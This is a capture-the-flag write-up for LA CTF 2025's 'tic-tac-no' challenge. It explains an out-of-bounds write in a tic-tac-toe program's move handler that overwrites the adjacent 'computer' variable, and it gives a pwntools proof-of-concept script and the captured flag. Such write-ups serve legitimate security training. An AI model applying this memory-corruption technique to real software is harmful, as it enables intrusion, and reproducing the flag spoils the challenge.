# Write up LA CTF 2025
## PWN
### tic-tac-no
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/tic-tac-no/chall
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
pwndbg>
```
```c
int main() {
   setbuf(stdout, NULL);
   char winner = ' ';
   char response = ' ';
   printf("You want the flag? You'll have to beat me first!");
   for (int i = 0; i < 9; i++) {
         board[i] = ' ';
   }

   while (winner == ' ' && checkFreeSpaces() != 0) {
      printBoard();

      playerMove();
      winner = checkWin();
      if (winner != ' ' || checkFreeSpaces() == 0) {
         break;
      }

      perfectComputerMove();
      winner = checkWin();
      if (winner != ' ' || checkFreeSpaces() == 0) {
         break;
      }
   }

   printBoard();
   if (winner == player) {
      printf("How's this possible? Well, I guess I'll have to give you the flag now.\n");
      FILE* flag = fopen("flag.txt", "r");
      char buf[256];
      fgets(buf, 256, flag);
      buf[strcspn(buf, "\n")] = '\0';
      puts(buf);
   }
   else {
      printf("Nice try, but I'm still unbeatable.\n");
   }

   return 0;
}
```
- play tic-tac-no.
- if winner = player, get flag.
```c
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```
- have OOB bug.
```c
char board[9];
char player = 'X';
char computer = 'O';
```
- `board[9]`, `player`, `computer` in bss.
#### exploit
- I use OOB bug in `playerMove` to set `computer` = `X`.
- I play to end game.
#### Proof of Concepts
```python
#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./chall ./libc.so.6 amd64
context.binary = exe = ELF("./chall")
# libc = ELF("./libc.so.6")
context.arch = "amd64"


script = '''
b*main+116
c
'''
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 30001)


def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def mov(x , y):
    sla(b'Enter row #(1-3): ' , str(x))
    sla(b'Enter column #(1-3): ' , str(y))

mov(1 , -22)
mov(6 , 2)
mov(6 , 3)

# lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}

p.interactive()
```